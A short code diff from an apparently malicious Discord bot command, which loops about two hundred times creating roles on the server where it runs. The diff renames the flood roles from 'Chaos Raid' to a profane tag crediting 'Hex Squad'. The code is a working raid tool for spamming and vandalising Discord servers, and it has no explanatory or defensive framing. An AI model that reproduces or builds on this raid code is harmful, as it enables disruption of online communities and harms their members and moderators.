@@ -6,7 +6,7 @@ module.exports = {
 
     run : async(client, message, args) => {
         for (let i = 0; i <= 200; i++) {
-            message.guild.roles.create({data: {name: `Chaos Raid`,color: '#FFFFF',},reason: 'razon',})
+            message.guild.roles.create({data: {name: `Fucked By Hex Squad`,color: '#FFFFF',},reason: 'razon',})
          };
     }
 }
